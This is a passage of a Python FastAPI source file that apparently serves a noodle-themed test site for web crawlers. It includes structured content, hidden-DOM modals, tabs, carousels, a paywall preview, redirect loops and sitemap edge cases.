    <a href="/self-reference-cycle-a">Return to cycle page A</a>
    """
    return html_page("Self Reference Cycle B", body)


@app.get("/sub-page-main-reference", response_class=HTMLResponse)
async def sub_page_main_reference():
    body = f"""
    <p>{food_paragraph("Sub-page main-reference")}</p>
    <a href="/">Back to the crawl test home page</a>
    """
    return html_page("Sub Page Main Reference", body)


def structured_content_links(items: list[tuple[str, str]]) -> str:
    return "".join(f'<li><a href="{escape(href, quote=True)}">{escape(label)}</a></li>' for href, label in items)


@app.get("/structured-content", response_class=HTMLResponse)
async def structured_content():
    body = f"""
    <p>Structured content hub with table, list, markdown-style, and article examples.</p>
    <ul>
      {structured_content_links([
          ("/structured-content/table", "Table examples"),
          ("/structured-content/list", "List examples"),
          ("/structured-content/markdown", "Markdown-style link examples"),
          ("/structured-content/article", "Article examples"),
      ])}
    </ul>
    """
    return html_page("Structured Content", body)


@app.get("/structured-content/table", response_class=HTMLResponse)
async def structured_content_table():
    body = f"""
    <p>Table content hub for structured extraction tests.</p>
    <ul>
      {structured_content_links([
          ("/structured-content/table/content", "Visible table content"),
          ("/structured-content/table/links", "Table cell links"),
      ])}
    </ul>
    """
    return html_page("Structured Table Content", body)


@app.get("/structured-content/list", response_class=HTMLResponse)
async def structured_content_list():
    body = f"""
    <p>List content hub for crawlers that extract ordered, unordered, and nested list content.</p>
    <ul>
      {structured_content_links([
          ("/structured-content/list/basic", "Basic list content"),
          ("/structured-content/list/nested", "Nested list content"),
      ])}
    </ul>
    """
    return html_page("Structured List Content", body)


@app.get("/structured-content/list/basic", response_class=HTMLResponse)
async def structured_content_list_basic():
    body = """
    <p>Basic menu lists with crawlable links inside list items.</p>
    <ul>
      <li>Sesame noodles with chili crisp <a href="/query-page?dish=sesame&from=basic-list">View sesame details</a></li>
      <li>Mushroom ramen with tofu <a href="/query-page?dish=mushroom&from=basic-list">View mushroom details</a></li>
      <li>Cold soba with citrus sauce <a href="/about?from=basic-list">About the noodle stand</a></li>
    </ul>
    <ol>
      <li>Choose broth</li>
      <li>Pick noodles</li>
      <li>Add toppings</li>
    </ol>
    """
    return html_page("Basic List Content", body)


@app.get("/structured-content/list/nested", response_class=HTMLResponse)
async def structured_content_list_nested():
    body = """
    <p>Nested list content with category links and child links.</p>
    <ul>
      <li>
        Broth bowls
        <ul>
          <li><a href="/query-page?category=shoyu&from=nested-list">Shoyu mushroom ramen</a></li>
          <li><a href="/query-page?category=miso&from=nested-list">Miso corn ramen</a></li>
        </ul>
      </li>
      <li>
        Dry noodles
        <ul>
          <li><a href="/query-page?category=sesame&from=nested-list">Sesame scallion noodles</a></li>
          <li><a href="/query-page?category=chili&from=nested-list">Chili garlic knife-cut noodles</a></li>
        </ul>
      </li>
    </ul>
    """
    return html_page("Nested List Content", body)


@app.get("/structured-content/markdown", response_class=HTMLResponse)
async def structured_content_markdown():
    body = f"""
    <p>Markdown-style content hub with rendered examples and crawlable links.</p>
    <ul>
      {structured_content_links([
          ("/structured-content/markdown/inline-links", "Markdown inline links"),
          ("/structured-content/markdown/reference-links", "Markdown reference links"),
          ("/structured-content/markdown/sample.md", "Raw Markdown document"),
      ])}
    </ul>
    """
    return html_page("Structured Markdown Content", body)


@app.get("/structured-content/markdown/sample.md")
async def structured_content_markdown_sample():
    content = """# Raw Markdown Crawl Fixture

This raw Markdown document is served as `text/markdown` for MIME type classification tests.

It includes an [inline About link](/about?from=markdown-document) and an [inline query link](/query-page?topic=markdown&from=markdown-document).

## List Links

- [Basic list content](/structured-content/list/basic?from=markdown-document)
- [Nested list content](/structured-content/list/nested?from=markdown-document)

## Reference Links

Read the [table links page][table-links] or the [structured content hub][structured-hub].

[table-links]: /structured-content/table/links?from=markdown-document
[structured-hub]: /structured-content?from=markdown-document
"""
    return Response(content=content, media_type="text/markdown")


@app.get("/structured-content/markdown/inline-links", response_class=HTMLResponse)
async def structured_content_markdown_inline_links():
    body = """
    <article>
      <p>This page mimics rendered Markdown with inline links such as <a href="/about?from=markdown-inline">About the noodle stand</a> and <a href="/query-page?topic=broth&from=markdown-inline">broth notes</a>.</p>
      <pre>[About the noodle stand](/about?from=markdown-inline)
[Broth notes](/query-page?topic=broth&amp;from=markdown-inline)</pre>
      <h2>Inline Link Notes</h2>
      <p>Inline links should be visible as ordinary anchors after Markdown rendering.</p>
    </article>
    """
    return html_page("Markdown Inline Links", body)


@app.get("/structured-content/markdown/reference-links", response_class=HTMLResponse)
async def structured_content_markdown_reference_links():
    body = """
    <article>
      <p>This page mimics rendered Markdown reference links for <a href="/query-page?topic=toppings&from=markdown-reference">topping notes</a> and <a href="/structured-content/list/basic?from=markdown-reference">basic list content</a>.</p>
      <pre>[topping notes]: /query-page?topic=toppings&amp;from=markdown-reference
[basic list content]: /structured-content/list/basic?from=markdown-reference</pre>
      <h2>Reference Link Notes</h2>
      <p>Reference-style links should resolve into crawlable anchors after content rendering.</p>
    </article>
    """
    return html_page("Markdown Reference Links", body)


@app.get("/structured-content/article", response_class=HTMLResponse)
async def structured_content_article():
    body = f"""
    <p>Article content hub for long-form and preview-style extraction tests.</p>
    <ul>
      {structured_content_links([
          ("/structured-content/article/paywall-preview", "Paywall preview article"),
      ])}
    </ul>
    """
    return html_page("Structured Article Content", body)


@app.get("/table-content")
async def table_content_legacy_redirect():
    return RedirectResponse("/structured-content/table/content", status_code=301)


@app.get("/structured-content/table/content", response_class=HTMLResponse)
async def table_content():
    body = """
    <p>Visible table content for crawlers that extract structured page text.</p>
    <table>
      <caption>Noodle Stand Menu</caption>
      <thead>
        <tr><th>Dish</th><th>Broth</th><th>Price</th></tr>
      </thead>
      <tbody>
        <tr><td>Sesame Noodles</td><td>Chili sesame</td><td>$9</td></tr>
        <tr><td>Mushroom Ramen</td><td>Shoyu mushroom</td><td>$12</td></tr>
        <tr><td>Cold Soba</td><td>Citrus dipping sauce</td><td>$10</td></tr>
      </tbody>
    </table>
    """
    return html_page("Table Content", body)


@app.get("/modal-popup", response_class=HTMLResponse)
async def modal_popup():
    head = """
    <style>
      #noodle-modal::backdrop {
        background: rgba(0, 0, 0, 0.32);
      }
      .hidden-dom-modal-content {
        opacity: 0;
        transform: translateY(8px) scale(0.98);
        transition: opacity 180ms ease, transform 180ms ease;
      }
      .hidden-dom-modal-content.is-open {
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    </style>
    """
    body = """
    <p>This page fetches modal content from the server only after the modal opens.</p>
    <button id="open-modal" type="button">Open hidden DOM modal</button>
    <dialog id="noodle-modal" aria-labelledby="modal-title"></dialog>
    """
    script = """
    <script>
      const modal = document.querySelector("#noodle-modal");
      const openModalButton = document.querySelector("#open-modal");
      let modalContent = null;

      function removeAfterTransition(element, done) {
        let finished = false;
        const finish = () => {
          if (finished) return;
          finished = true;
          element.removeEventListener("transitionend", finish);
          element.remove();
          if (done) done();
        };
        element.addEventListener("transitionend", finish);
        setTimeout(finish, 240);
      }

      async function openServerModal() {
        if (modal.open) return;
        openModalButton.disabled = true;
        const response = await fetch("/server-only/modal-popup");
        const content = document.createElement("section");
        content.className = "hidden-dom-modal-content";
        content.innerHTML = await response.text();
        modal.replaceChildren(content);
        modalContent = content;
        modal.showModal();
        requestAnimationFrame(() => content.classList.add("is-open"));
        openModalButton.disabled = false;
      }

      function closeServerModal() {
        if (!modalContent) {
          if (modal.open) modal.close();
          return;
        }
        const closing = modalContent;
        modalContent = null;
        closing.classList.remove("is-open");
        removeAfterTransition(closing, () => {
          modal.replaceChildren();
          if (modal.open) modal.close();
        });
      }

      openModalButton.addEventListener("click", openServerModal);
      modal.addEventListener("click", (event) => {
        if (event.target === modal || event.target.id === "close-modal") {
          closeServerModal();
        }
      });
      modal.addEventListener("cancel", (event) => {
        event.preventDefault();
        closeServerModal();
      });
    </script>
    """
    return html_page("Modal popup page - Hidden DOM", body, head=head, script=script)


@app.get("/server-only/modal-popup", response_class=HTMLResponse)
async def server_only_modal_popup():
    return HTMLResponse(
        """
        <h2 id="modal-title">Server-only modal details</h2>
        <p>Server-only modal content: spicy garlic noodles are available after the popup fetch.</p>
        <a href="/query-page?from=server-modal-popup">Server modal child link</a>
        <button id="close-modal" type="button">Close</button>
        """
    )


@app.get("/accordion", response_class=HTMLResponse)
async def accordion():
    head = """
    <style>
      .accordion-item {
        margin-bottom: 10px;
      }
      .accordion-panel {
        border-left: 3px solid #777;
        margin-top: 8px;
        padding-left: 12px;
      }
      .hidden-dom-content {
        max-height: 0;
        opacity: 0;
        overflow: hidden;
        transform: translateY(-4px);
        transition: max-height 180ms ease, opacity 180ms ease, transform 180ms ease;
      }
      .hidden-dom-content.is-open {
        max-height: 360px;
        opacity: 1;
        transform: translateY(0);
      }
    </style>
    """
    body = """
    <p>Accordion panels fetch server content only while each panel is open.</p>
    <section class="accordion-item">
      <button class="accordion-toggle" type="button" aria-expanded="false" aria-controls="accordion-soup" data-endpoint="/server-only/accordion/soup">Soup noodles</button>
      <div id="accordion-soup" class="accordion-panel"></div>
    </section>
    <section class="accordion-item">
      <button class="accordion-toggle" type="button" aria-expanded="false" aria-controls="accordion-dry" data-endpoint="/server-only/accordion/dry">Dry noodles</button>
      <div id="accordion-dry" class="accordion-panel"></div>
    </section>
    """
    script = """
    <script>
      function removeAfterTransition(element, done) {
        let finished = false;
        const finish = () => {
          if (finished) return;
          finished = true;
          element.removeEventListener("transitionend", finish);
          element.remove();
          if (done) done();
        };
        element.addEventListener("transitionend", finish);
        setTimeout(finish, 240);
      }

      async function openAccordionPanel(button, panel) {
        if (panel.firstElementChild) return;
        button.disabled = true;
        const response = await fetch(button.dataset.endpoint);
        const content = document.createElement("div");
        content.className = "hidden-dom-content";
        content.innerHTML = await response.text();
        panel.replaceChildren(content);
        requestAnimationFrame(() => content.classList.add("is-open"));
        button.setAttribute("aria-expanded", "true");
        button.disabled = false;
      }

      function closeAccordionPanel(button, panel) {
        const content = panel.firstElementChild;
        if (!content) return;
        button.disabled = true;
        button.setAttribute("aria-expanded", "false");
        content.classList.remove("is-open");
        removeAfterTransition(content, () => {
          button.disabled = false;
        });
      }

      document.querySelectorAll(".accordion-toggle").forEach((button) => {
        const panel = document.querySelector("#" + button.getAttribute("aria-controls"));
        button.addEventListener("click", () => {
          if (panel.firstElementChild) {
            closeAccordionPanel(button, panel);
          } else {
            openAccordionPanel(button, panel);
          }
        });
      });
    </script>
    """
    return html_page("Accordion page - Hidden DOM", body, head=head, script=script)


@app.get("/server-only/accordion/soup", response_class=HTMLResponse)
async def server_only_accordion_soup():
    return HTMLResponse(
        """
        <p>Server-only accordion soup content: clear broth noodles with ginger, scallion, and carrots.</p>
        <a href="/query-page?dish=server-soup-noodles">Server soup noodle details</a>
        """
    )


@app.get("/server-only/accordion/dry", response_class=HTMLResponse)
async def server_only_accordion_dry():
    return HTMLResponse(
        """
        <p>Server-only accordion dry content: dry tossed noodles with sesame paste and pickled cucumber.</p>
        <a href="/query-page?dish=server-dry-noodles">Server dry noodle details</a>
        """
    )


@app.get("/tabs", response_class=HTMLResponse)
async def tabs():
    head = """
    <style>
      .tab-panel {
        border: 1px solid #999;
        margin-top: 12px;
        min-height: 1px;
        padding: 12px;
      }
      .tab-panel:empty {
        display: none;
      }
      .tab-panel p {
        margin-bottom: 18px;
      }
      .hidden-dom-content {
        max-height: 0;
        opacity: 0;
        overflow: hidden;
        transform: translateY(-4px);
        transition: max-height 180ms ease, opacity 180ms ease, transform 180ms ease;
      }
      .hidden-dom-content.is-open {
        max-height: 520px;
        opacity: 1;
        transform: translateY(0);
      }
      #tab-page-footer {
        border-top: 1px solid #777;
        margin-top: 24px;
        padding-top: 12px;
      }
    </style>
    """
    body = """
    <p>Tabbed noodle notes fetch server content only while a tab is selected.</p>
    <div role="tablist" aria-label="Noodle tabs">
      <button class="server-tab" role="tab" type="button" aria-controls="server-tab-panel" aria-selected="false" data-endpoint="/server-only/tabs/broth">Broth</button>
      <button class="server-tab" role="tab" type="button" aria-controls="server-tab-panel" aria-selected="false" data-endpoint="/server-only/tabs/toppings">Toppings</button>
      <button class="server-tab" role="tab" type="button" aria-controls="server-tab-panel" aria-selected="false" data-endpoint="/server-only/tabs/links">Links</button>
    </div>
    <section id="server-tab-panel" class="tab-panel" role="tabpanel" aria-live="polite"></section>
    <footer id="tab-page-footer">
      <p>Tab page footer. This footer moves down only while fetched tab content is inserted above it.</p>
    </footer>
    """
    script = """
    <script>
      const tabButtons = document.querySelectorAll(".server-tab");
      const tabPanel = document.querySelector("#server-tab-panel");
      let activeTabButton = null;
      let activeTabContent = null;

      function removeAfterTransition(element) {
        return new Promise((resolve) => {
          let finished = false;
          const finish = () => {
            if (finished) return;
            finished = true;
            element.removeEventListener("transitionend", finish);
            element.remove();
            resolve();
          };
          element.addEventListener("transitionend", finish);
          setTimeout(finish, 240);
        });
      }

      function setSelectedTab(button) {
        tabButtons.forEach((tab) => {
          tab.setAttribute("aria-selected", tab === button ? "true" : "false");
        });
      }

      async function closeActiveTab() {
        if (!activeTabContent) return;
        const closing = activeTabContent;
        activeTabContent = null;
        activeTabButton = null;
        setSelectedTab(null);
        closing.classList.remove("is-open");
        await removeAfterTransition(closing);
      }

      async function openTab(button) {
        tabButtons.forEach((tab) => {
          tab.disabled = true;
        });
        await closeActiveTab();
        const response = await fetch(button.dataset.endpoint);
        const content = document.createElement("div");
        content.className = "hidden-dom-content generated-tab-content";
        content.innerHTML = await response.text();
        tabPanel.replaceChildren(content);
        activeTabContent = content;
        activeTabButton = button;
        setSelectedTab(button);
        requestAnimationFrame(() => content.classList.add("is-open"));
        tabButtons.forEach((tab) => {
          tab.disabled = false;
        });
      }

      tabButtons.forEach((button) => {
        button.addEventListener("click", async () => {
          if (activeTabButton === button) {
            tabButtons.forEach((tab) => {
              tab.disabled = true;
            });
            await closeActiveTab();
            tabButtons.forEach((tab) => {
              tab.disabled = false;
            });
          } else {
            await openTab(button);
          }
        });
      });
    </script>
    """
    return html_page("Tab page - Hidden DOM", body, head=head, script=script)


@app.get("/server-only/tabs/broth", response_class=HTMLResponse)
async def server_only_tabs_broth():
    return HTMLResponse(
        """
        <h2>Server-only broth tab</h2>
        <p>Server-only broth tab content: light soy broth with roasted onion, ginger, garlic oil, and a long tasting note.</p>
        <p><a href="/query-page?from=server-tab-broth">Server broth tab child link</a></p>
        """
    )


@app.get("/server-only/tabs/toppings", response_class=HTMLResponse)
async def server_only_tabs_toppings():
    return HTMLResponse(
        """
        <h2>Server-only toppings tab</h2>
        <p>Server-only toppings tab content: egg, corn, tofu, scallion, seaweed, pickled mushrooms, and crunchy garlic crumbs.</p>
        <p><a href="/query-page?from=server-tab-toppings">Server toppings tab child link</a></p>
        """
    )


@app.get("/server-only/tabs/links", response_class=HTMLResponse)
async def server_only_tabs_links():
    return HTMLResponse(
        """
        <h2>Server-only links tab</h2>
        <p>Server-only links tab content: crawler-visible child appears only after tab selection.</p>
        <p><a href="/query-page?from=server-tab-links">Server links tab child link</a></p>
        """
    )


@app.get("/custom-video", response_class=HTMLResponse)
async def custom_video():
    head = """
    <style>
      .video-frame {
        border: 0;
        display: block;
        height: 315px;
        max-width: 560px;
        width: 100%;
      }
      .custom-video-controls {
        display: flex;
        gap: 8px;
        margin-top: 10px;
      }
      .custom-video-button {
        border: 1px solid #333;
        cursor: pointer;
        padding: 8px 12px;
        user-select: none;
      }
    </style>
    """
    body = """
    <p>Embedded official video with custom div-based controls for crawler and interaction tests.</p>
    <iframe
      id="rickroll-embed"
      class="video-frame"
      src="https://www.youtube.com/embed/dQw4w9WgXcQ"
      title="Official Rick Astley video embed"
      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
      allowfullscreen
    ></iframe>
    <div class="custom-video-controls" aria-label="Custom video controls">
      <div
        id="custom-video-play"
        class="custom-video-button"
        role="button"
        tabindex="0"
        aria-label="Play embedded video"
        data-video-url="https://www.youtube.com/embed/dQw4w9WgXcQ"
      >
        Play embed
      </div>
      <div
        id="custom-video-reset"
        class="custom-video-button"
        role="button"
        tabindex="0"
        aria-label="Reset embedded video"
      >
        Reset embed
      </div>
    </div>
    <p id="video-status">Embedded video is loaded but has not been started by the custom control.</p>
    """
    script = """
    <script>
      const frame = document.querySelector("#rickroll-embed");
      const playControl = document.querySelector("#custom-video-play");
      const resetControl = document.querySelector("#custom-video-reset");
      const activatePlay = () => {
        frame.src = playControl.dataset.videoUrl + "?autoplay=1";
        document.querySelector("#video-status").textContent =
          "Custom play control activated the embedded video.";
      };
      const activateReset = () => {
        frame.src = playControl.dataset.videoUrl;
        document.querySelector("#video-status").textContent =
          "Embedded video was reset by the custom control.";
      };
      playControl.addEventListener("click", activatePlay);
      resetControl.addEventListener("click", activateReset);
      playControl.addEventListener("keydown", (event) => {
        if (event.key === "Enter" || event.key === " ") activatePlay();
      });
      resetControl.addEventListener("keydown", (event) => {
        if (event.key === "Enter" || event.key === " ") activateReset();
      });
    </script>
    """
    return html_page("Custom Video Control", body, head=head, script=script)


@app.get("/fr/about", response_class=HTMLResponse)
async def french_about_path_variant():
    return french_about_page()


@app.get("/fr/noodles")
async def old_french_noodles_redirect():
    return RedirectResponse("/fr/about", status_code=301)


@app.get("/css-generated", response_class=HTMLResponse)
async def css_generated():
    head = """
    <style>
      .generated-noodle-note::after {
        content: " CSS after content: crispy noodle garnish is visible.";
        display: block;
        margin-top: 8px;
      }
    </style>
    """
    body = """
    <p class="generated-noodle-note">Base paragraph before generated content.</p>
    """
    return html_page("CSS Generated Content", body, head=head)


@app.get("/carousel", response_class=HTMLResponse)
async def carousel():
    head = """
    <style>
      .carousel-track {
        display: flex;
        gap: 12px;
        max-width: 520px;
        overflow-x: auto;
        scroll-snap-type: x mandatory;
      }
      .carousel-slide {
        border: 1px solid #999;
        flex: 0 0 240px;
        padding: 12px;
        scroll-snap-align: start;
      }
    </style>
    """
    body = """
    <p>Horizontal carousel slider with noodle cards.</p>
    <div class="carousel-track" aria-label="Noodle carousel">
      <section class="carousel-slide"><h2>Slide 1</h2><p>Hand-pulled noodles.</p></section>
      <section class="carousel-slide"><h2>Slide 2</h2><p>Tomato egg noodles.</p></section>
      <section class="carousel-slide"><h2>Slide 3</h2><p><a href="/query-page?from=carousel">Carousel child link</a></p></section>
    </div>
    """
    return html_page("Horizontal Carousel", body, head=head)


@app.get("/carousel-arrows", response_class=HTMLResponse)
async def carousel_arrows():
    head = """
    <style>
      .arrow-carousel {
        max-width: 560px;
      }
      .arrow-carousel-controls {
        display: flex;
        gap: 8px;
        margin-bottom: 10px;
      }
      .arrow-carousel-controls button {
        min-width: 44px;
        min-height: 36px;
      }
      .arrow-carousel-track {
        display: flex;
        gap: 12px;
        overflow-x: hidden;
        scroll-behavior: smooth;
        scroll-snap-type: x mandatory;
      }
      .arrow-carousel-slide {
        border: 1px solid #999;
        flex: 0 0 240px;
        padding: 12px;
        scroll-snap-align: start;
      }
    </style>
    """
    body = """
    <p>Horizontal carousel slider with arrow navigation controls.</p>
    <section class="arrow-carousel" aria-label="Noodle carousel with arrows">
      <div class="arrow-carousel-controls" aria-label="Carousel controls">
        <button id="carousel-prev" type="button" aria-label="Previous slide">&lt;</button>
        <button id="carousel-next" type="button" aria-label="Next slide">&gt;</button>
      </div>
      <div id="arrow-carousel-track" class="arrow-carousel-track" tabindex="0">
        <section class="arrow-carousel-slide"><h2>Slide 1</h2><p>Knife-cut chili noodles.</p></section>
        <section class="arrow-carousel-slide"><h2>Slide 2</h2><p>Mushroom udon with scallions.</p></section>
        <section class="arrow-carousel-slide"><h2>Slide 3</h2><p><a href="/query-page?from=carousel-arrows">Arrow carousel child link</a></p></section>
        <section class="arrow-carousel-slide"><h2>Slide 4</h2><p>Cold sesame noodles with cucumber.</p></section>
      </div>
    </section>
    """
    script = """
    <script>
      const arrowCarouselTrack = document.querySelector("#arrow-carousel-track");
      const slideStep = 252;
      document.querySelector("#carousel-prev").addEventListener("click", () => {
        arrowCarouselTrack.scrollBy({ left: -slideStep, behavior: "smooth" });
      });
      document.querySelector("#carousel-next").addEventListener("click", () => {
        arrowCarouselTrack.scrollBy({ left: slideStep, behavior: "smooth" });
      });
    </script>
    """
    return html_page("Horizontal Carousel With Arrows", body, head=head, script=script)


@app.get("/chatbot-widget", response_class=HTMLResponse)
async def chatbot_widget():
    head = """
    <style>
      #local-chatbot-fallback {
        background: #ffffff;
        border: 1px solid #777;
        bottom: 20px;
        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.22);
        max-width: 280px;
        padding: 12px;
        position: fixed;
        right: 20px;
        z-index: 20;
      }
      #local-chatbot-fallback summary {
        cursor: pointer;
        font-weight: 700;
      }
      #local-chatbot-fallback a {
        display: inline-block;
        margin-top: 8px;
      }
    </style>
    """
    body = """
    <p>Chatbot widget test page with noodle ordering notes.</p>
    <p>The live chat embed is inserted before the closing body tag.</p>
    <details id="local-chatbot-fallback" open>
      <summary>Comm100 local chat fallback</summary>
      <p>Hello! Need noodle recommendations or help testing crawler widget extraction?</p>
      <a href="/query-page?from=chatbot-widget">Chat widget child link</a>
    </details>
    """
    script = """<!--Begin Comm100 Live Chat Code-->
<div id="comm100-button-f8b6f7b2-991b-4987-adc2-fd7a98083523"></div>
<script type="text/javascript">
  var Comm100API=Comm100API||{};(function(t){function e(e){var a=document.createElement("script"),c=document.getElementsByTagName("script")[0];a.type="text/javascript",a.async=!0,a.src=e+t.site_id,c.parentNode.insertBefore(a,c)}t.chat_buttons=t.chat_buttons||[],t.chat_buttons.push({code_plan:"f8b6f7b2-991b-4987-adc2-fd7a98083523",div_id:"comm100-button-f8b6f7b2-991b-4987-adc2-fd7a98083523"}),t.site_id=10100000,t.main_code_plan="f8b6f7b2-991b-4987-adc2-fd7a98083523",e("https://vue.comm100.com/livechat.ashx?siteId="),setTimeout(function(){t.loaded||e("https://standby.comm100vue.com/livechat.ashx?siteId=")},5e3)})(Comm100API||{})
</script>
<!--End Comm100 Live Chat Code-->"""
    return html_page("Chatbot Widget", body, head=head, script=script)


@app.get("/scroll-reveal", response_class=HTMLResponse)
async def scroll_reveal():
    body = """
    <p>Scroll down to reveal lazy-loaded noodle content.</p>
    <div style="height: 1600px"></div>
    <div id="scroll-reveal-result"></div>
    """
    script = """
    <script>
      let revealed = false;
      window.addEventListener("scroll", () => {
        if (revealed) return;
        if (window.scrollY + window.innerHeight >= document.body.scrollHeight - 20) {
          revealed = true;
          document.querySelector("#scroll-reveal-result").innerHTML =
            '<p>Scroll-triggered noodle content is now visible.</p><a href="/query-page?from=scroll-reveal">Scroll reveal child link</a>';
        }
      });
    </script>
    """
    return html_page("Scroll Triggered Reveal", body, script=script)


@app.get("/iframe-pdf", response_class=HTMLResponse)
async def iframe_pdf():
    body = """
    <p>PDF embedded in an iframe for crawler media handling tests.</p>
    <iframe src="/files/sample.pdf" title="Sample PDF asset" width="400" height="300"></iframe>
    """
    return html_page("Iframe PDF", body)


@app.get("/paywall-preview")
async def paywall_preview_legacy_redirect():
    return RedirectResponse("/structured-content/article/paywall-preview", status_code=301)


@app.get("/structured-content/article/paywall-preview", response_class=HTMLResponse)
async def paywall_preview():
    head = """
    <style>
      .paywall-article {
        max-width: 680px;
        position: relative;
      }
      .paywall-preview-copy {
        line-height: 1.65;
      }
      .paywall-fade-zone {
        max-height: 210px;
        overflow: hidden;
        position: relative;
      }
      .paywall-fade-zone::after {
        background: linear-gradient(rgba(255, 255, 255, 0), #ffffff 78%);
        content: "";
        inset: 0;
        position: absolute;
      }
      .paywall-locked-copy {
        color: #555;
      }
      .subscribe-block {
        background: #ffffff;
        border: 1px solid #333;
        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.18);
        margin: -40px auto 0;
        max-width: 420px;
        padding: 18px;
        position: relative;
        text-align: center;
        z-index: 2;
      }
      .subscribe-block a {
        display: inline-block;
        margin-top: 8px;
      }
    </style>
    """
    body = """
    <article class="paywall-article">
      <p class="paywall-preview-copy">The first bowl arrived with sesame oil shimmering on mushroom broth, spring greens folded under the noodles, and scallions bright enough to wake up the whole counter.</p>
      <p class="paywall-preview-copy">By the second tasting, the shop's handwritten menu had become a small map of chili paste, black vinegar, tofu, garlic chips, and chewy knife-cut noodles.</p>
      <div class="paywall-fade-zone" aria-label="Fading locked article preview">
        <section class="paywall-locked-copy">
          <p>The third bowl was where the ranking changed. A quiet shoyu broth carried roasted corn, bamboo shoots, and a slow mushroom depth that made the louder chili bowls feel less certain.</p>
          <p>The fourth bowl leaned cold and sharp, with citrus dipping sauce and buckwheat noodles that held their bite even after a long pause for notes.</p>
          <p>The final bowl is intentionally faded behind the subscription panel, like a news or magazine article that shows the beginning before asking readers to subscribe.</p>
          <a href="/query-page?from=paywall-preview">Faded article child link</a>
        </section>
      </div>
      <section class="subscribe-block" aria-label="Subscription required">
        <h2>Keep reading</h2>
        <p>Subscribe to unlock the full noodle ranking, tasting notes, and final recommendation.</p>
        <a href="/query-page?from=paywall-subscribe">Subscribe prompt link</a>
      </section>
    </article>
    """
    return html_page("Paywall Preview", body, head=head)


@app.get("/blocking-popup", response_class=HTMLResponse)
async def blocking_popup():
    head = """
    <style>
      #blocking-overlay {
        align-items: center;
        background: rgba(0, 0, 0, 0.72);
        color: white;
        display: flex;
        inset: 0;
        justify-content: center;
        position: fixed;
        z-index: 10;
      }
      #blocking-overlay div {
        background: #222;
        border: 1px solid #eee;
        padding: 20px;
      }
    </style>
    """
    body = """
    <p>Underlying page content about noodle specials.</p>
    <a href="/query-page?from=blocking-popup">Underlying child link</a>
    <div id="blocking-overlay" role="dialog" aria-modal="true">
      <div>
        <p>Blocking popup overlay: accept to see the noodle page.</p>
        <button id="dismiss-overlay" type="button">Dismiss overlay</button>
      </div>
    </div>
    """
    script = """
    <script>
      document.querySelector("#dismiss-overlay").addEventListener("click", () => {
        document.querySelector("#blocking-overlay").remove();
      });
    </script>
    """
    return html_page("Blocking Popup Overlay", body, head=head, script=script)


@app.get("/javascript-created-links", response_class=HTMLResponse)
async def javascript_created_links():
    body = """
    <p>JavaScript creates links after the static HTML has loaded.</p>
    <div id="dynamic-link-target"></div>
    """
    script = """
    <script>
      const links = [
        { href: "/about?from=javascript-created", text: "JS created about link" },
        { href: "/query-page?from=javascript-created", text: "JS created query link" }
      ];
      const target = document.querySelector("#dynamic-link-target");
      links.forEach((item) => {
        const anchor = document.createElement("a");
        anchor.href = item.href;
        anchor.textContent = item.text;
        target.appendChild(anchor);
        target.appendChild(document.createElement("br"));
      });
    </script>
    """
    return html_page("JavaScript Created Links", body, script=script)


@app.get("/redirect-loop-a")
async def redirect_loop_a():
    return RedirectResponse("/redirect-loop-b", status_code=302)


@app.get("/redirect-loop-b")
async def redirect_loop_b():
    return RedirectResponse("/redirect-loop-a", status_code=302)


@app.get("/depth/0", response_class=HTMLResponse)
async def depth_level_0():
    body = f"""
    <p>Depth test level 0. This chain has {TOTAL_DEPTH_PAGES} pages, from /depth/0 through /depth/{MAX_DEPTH_LEVEL}.</p>
    <p>After level {MAX_DEPTH_LEVEL}, the chain exits to the About page.</p>
    <a href="/depth/1">Next depth target</a>
    """
    return html_page("Depth Level 0", body)


@app.get("/image-link", response_class=HTMLResponse)
async def image_link():
    body = """
    <p>Image wrapped in an anchor that directs to a valid page.</p>
    <a href="/about?from=image-link">
      <img src="/media/shrek-rizz-face.jpg" alt="An Image of Shrek's face!" />
    </a>
    """
    return html_page("Image Link", body)


@app.get("/table-link")
async def table_link_legacy_redirect():
    return RedirectResponse("/structured-content/table/links", status_code=301)


@app.get("/structured-content/table/links", response_class=HTMLResponse)
async def table_link():
    body = """
    <p>Table cell links are embedded in a valid noodle menu table.</p>
    <table>
      <caption>Neighborhood Noodle Menu With Detail Links</caption>
      <thead>
        <tr>
          <th scope="col">Dish</th>
          <th scope="col">Broth or Sauce</th>
          <th scope="col">Toppings</th>
          <th scope="col">Heat Level</th>
          <th scope="col">Details</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <th scope="row">Sesame Scallion Noodles</th>
          <td>Toasted sesame sauce with light soy</td>
          <td>Cucumber, scallion, crushed peanuts</td>
          <td>Mild</td>
          <td><a href="/query-page?dish=sesame-scallion&from=table-cell">View sesame scallion details</a></td>
        </tr>
        <tr>
          <th scope="row">Mushroom Shoyu Ramen</th>
          <td>Slow mushroom shoyu broth</td>
          <td>Tofu, bamboo shoots, roasted corn</td>
          <td>Medium</td>
          <td><a href="/about?from=table-cell">About this noodle stand</a></td>
        </tr>
        <tr>
          <th scope="row">Chili Garlic Knife-Cut Noodles</th>
          <td>Chili oil and black vinegar sauce</td>
          <td>Bok choy, garlic chips, soft egg</td>
          <td>Hot</td>
          <td><a href="/query-page?dish=chili-garlic&from=table-cell">View chili garlic details</a></td>
        </tr>
      </tbody>
    </table>
    """
    return html_page("Table Cell Link", body)


@app.get("/sitemap-only", response_class=HTMLResponse)
async def sitemap_only():
    body = """
    <p>This noodle page is intentionally absent from HTML link graphs.</p>
    <p>Crawlers should reach it from the XML sitemap, then extract this ordinary page content.</p>
    """
    return html_page("Sitemap Only Page", body)


@app.get("/sitemap-discovery-fail", response_class=HTMLResponse)
async def sitemap_discovery_fail():
    head = '<link rel="sitemap" type="application/xml" href="/sitemap-discovery-fail.xml" />'
    body = """
    <p>This page advertises a sitemap that fails, but its normal page links remain valid.</p>
    <ul>
      <li><a href="/about?from=sitemap-discovery-fail">Fallback About link</a></li>
      <li><a href="/structured-content/table/links?from=sitemap-discovery-fail">Fallback table link</a></li>
      <li><a href="/query-page?from=sitemap-discovery-fail">Fallback query link</a></li>
    </ul>
    """
    return html_page("Sitemap Discovery Failure", body, head=head)


@app.get("/sitemap-discovery-fail.xml")
async def sitemap_discovery_fail_xml():
    content = """<?xml version="1.0" encoding="UTF-8"?>
<urlset>
  <url><loc>/about
"""
